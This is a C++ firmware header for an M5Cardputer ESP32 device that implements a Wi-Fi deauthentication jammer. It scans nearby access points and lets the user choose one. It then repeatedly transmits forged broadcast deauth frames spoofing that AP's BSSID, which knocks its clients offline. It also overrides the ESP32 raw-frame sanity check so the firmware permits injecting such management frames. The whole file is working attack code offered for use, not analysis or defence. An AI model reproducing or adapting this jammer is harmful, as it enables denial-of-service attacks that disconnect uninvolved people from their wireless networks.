#pragma once
#include <M5Cardputer.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"
#include "../main_menu.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) {
        return 1;
    }
    return 0;
}

class WifiModule {
public:
    static constexpr int MAX_APS = 24;

    struct ApEntry {
        char ssid[33];
        uint8_t bssid[6];
        int32_t rssi;
        uint8_t channel;
    };

    void enter() {
        jamming_ = false;
        selectedIdx_ = 0;
        apCount_ = 0;
        txOk_ = 0;
        txErr_ = 0;
        scanNetworks();
        draw();
    }

    bool update(const NavInput& nav) {
        if (nav.back) {
            stopJamming();
            return true;
        }

        if (jamming_) {
            if (nav.select) {
                stopJamming();
                draw();
            } else {
                stepJam();
            }
            return false;
        }

        if (apCount_ > 0) {
            if (nav.up) {
                selectedIdx_ = (selectedIdx_ - 1 + apCount_) % apCount_;
                draw();
            }
            if (nav.down) {
                selectedIdx_ = (selectedIdx_ + 1) % apCount_;
                draw();
            }
            if (nav.select) {
                startJamming();
                draw();
            }
        } else if (nav.select) {
            scanNetworks();
            draw();
        }

        return false;
    }

private:
    static constexpr uint8_t DEAUTH_FRAME_DEFAULT[26] = {
        0xc0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x02, 0x00
    };

    ApEntry aps_[MAX_APS];
    int apCount_ = 0;
    int selectedIdx_ = 0;
    bool jamming_ = false;
    uint32_t txOk_ = 0;
    uint32_t txErr_ = 0;
    uint8_t deauthFrame_[sizeof(DEAUTH_FRAME_DEFAULT)];
    unsigned long lastSendMs_ = 0;
    unsigned long lastUiMs_ = 0;

    void scanNetworks() {
        auto& d = M5Cardputer.Display;
        d.fillScreen(THEME_BG);
        d.setTextColor(THEME_FG, THEME_BG);
        d.setTextSize(2);
        d.setCursor(12, 48);
        d.print("Scanning Wi-Fi...");

        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
        delay(80);

        int found = WiFi.scanNetworks(false, true);
        apCount_ = (found > MAX_APS) ? MAX_APS : ((found > 0) ? found : 0);
        selectedIdx_ = 0;

        for (int i = 0; i < apCount_; ++i) {
            String s = WiFi.SSID(i);
            if (s.length() == 0) {
                snprintf(aps_[i].ssid, sizeof(aps_[i].ssid), "<Hidden>");
            } else {
                s.toCharArray(aps_[i].ssid, sizeof(aps_[i].ssid));
            }

            uint8_t* mac = WiFi.BSSID(static_cast<uint8_t>(i));
            if (mac) {
                memcpy(aps_[i].bssid, mac, 6);
            } else {
                memset(aps_[i].bssid, 0xFF, 6);
            }

            aps_[i].rssi = WiFi.RSSI(static_cast<uint8_t>(i));
            aps_[i].channel = static_cast<uint8_t>(WiFi.channel(static_cast<uint8_t>(i)));
        }

        WiFi.scanDelete();
    }

    void wslBypasserSendRawFrame(const uint8_t* frameBuffer, int size) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frameBuffer, size, false);
        if (err == ESP_OK) {
            txOk_++;
            Serial.println(" -> Sent deauth frame");
        } else {
            txErr_++;
        }
    }

    void wslBypasserPrepareDeauthFrame(const uint8_t* bssid, uint8_t chan) {
        Serial.print("Preparing deauth frame to -> ");
        for (int j = 0; j < 6; j++) {
            Serial.print(bssid[j], HEX);
            if (j < 5) Serial.print(":");
        }
        Serial.println();

        memcpy(deauthFrame_, DEAUTH_FRAME_DEFAULT, sizeof(DEAUTH_FRAME_DEFAULT));
        esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
        memcpy(&deauthFrame_[10], bssid, 6);
        memcpy(&deauthFrame_[16], bssid, 6);
    }

    void startJamming() {
        if (apCount_ <= 0) return;
        const ApEntry& target = aps_[selectedIdx_];

        WiFi.disconnect(false, true);
        WiFi.mode(WIFI_AP);
        WiFi.softAP("m5_deauth", nullptr, target.channel, 1, 1);
        delay(50);

        esp_wifi_set_promiscuous(true);
        wslBypasserPrepareDeauthFrame(target.bssid, target.channel);

        txOk_ = 0;
        txErr_ = 0;
        lastSendMs_ = 0;
        lastUiMs_ = 0;
        jamming_ = true;
    }

    void stopJamming() {
        if (!jamming_) return;
        jamming_ = false;
        esp_wifi_set_promiscuous(false);
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
    }

    void stepJam() {
        if (apCount_ <= 0) return;
        unsigned long now = millis();
        if (now - lastSendMs_ < 15) {
            return;
        }
        lastSendMs_ = now;

        for (int i = 0; i < 3; ++i) {
            uint16_t seq = static_cast<uint16_t>(random(0, 4096));
            deauthFrame_[22] = static_cast<uint8_t>((seq >> 4) & 0xFF);
            deauthFrame_[23] = static_cast<uint8_t>((seq & 0x0F) << 4);
            wslBypasserSendRawFrame(deauthFrame_, sizeof(deauthFrame_));
        }

        if (now - lastUiMs_ >= 150) {
            lastUiMs_ = now;
            auto& d = M5Cardputer.Display;
            d.setTextSize(1);
            d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
            d.setCursor(16, 86);
            d.printf("OK: %lu  Err: %lu   ",
                     static_cast<unsigned long>(txOk_),
                     static_cast<unsigned long>(txErr_));
        }
    }

    void draw() {
        auto& d = M5Cardputer.Display;
        d.fillScreen(THEME_BG);
        d.setTextColor(THEME_FG, THEME_BG);

        if (apCount_ == 0) {
            d.setTextSize(2);
            d.setCursor(12, 24);
            d.print("No Wi-Fi found");
            d.setTextSize(1);
            d.setCursor(12, 60);
            d.print("Enter: Rescan | `/Bksp: Back");
            return;
        }

        if (jamming_) {
            const ApEntry& ap = aps_[selectedIdx_];
            d.fillRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_HIGHLIGHT);
            d.drawRoundRect(8, 8, d.width() - 16, d.height() - 16, 6, THEME_BORDER);
            d.setTextColor(THEME_FG, THEME_HIGHLIGHT);

            d.setTextSize(2);
            d.setCursor(16, 16);
            d.print("JAMMING ACTIVE");

            d.setCursor(16, 44);
            d.printf("%.14s", ap.ssid);

            d.setTextSize(1);
            d.setCursor(16, 70);
            d.printf("CH: %d  RSSI: %ld dBm", ap.channel, static_cast<long>(ap.rssi));

            d.setCursor(16, 86);
            d.printf("OK: %lu  Err: %lu",
                     static_cast<unsigned long>(txOk_),
                     static_cast<unsigned long>(txErr_));

            d.setCursor(16, 108);
            d.print("Enter: Stop Jam | `/Bksp: Back");
            return;
        }

        const int visibleRows = 4;
        int startIdx = 0;
        if (selectedIdx_ >= visibleRows) {
            startIdx = selectedIdx_ - visibleRows + 1;
        }

        d.setTextSize(2);
        for (int row = 0; row < visibleRows; ++row) {
            int idx = startIdx + row;
            if (idx >= apCount_) break;

            int y = 6 + row * 28;
            bool sel = (idx == selectedIdx_);

            if (sel) {
                d.fillRoundRect(8, y, d.width() - 16, 25, 4, THEME_HIGHLIGHT);
                d.drawRoundRect(8, y, d.width() - 16, 25, 4, THEME_BORDER);
                d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
            } else {
                d.setTextColor(THEME_FG, THEME_BG);
            }

            d.setCursor(12, y + 5);
            d.print(sel ? "> " : "  ");
            d.printf("%.13s", aps_[idx].ssid);
        }

        d.setTextSize(1);
        d.setTextColor(THEME_FG, THEME_BG);
        d.setCursor(10, 122);
        d.printf("CH:%d %lddBm | Enter:Jam `/Bksp:Back",
                 aps_[selectedIdx_].channel,
                 static_cast<long>(aps_[selectedIdx_].rssi));
    }
};

constexpr uint8_t WifiModule::DEAUTH_FRAME_DEFAULT[26];
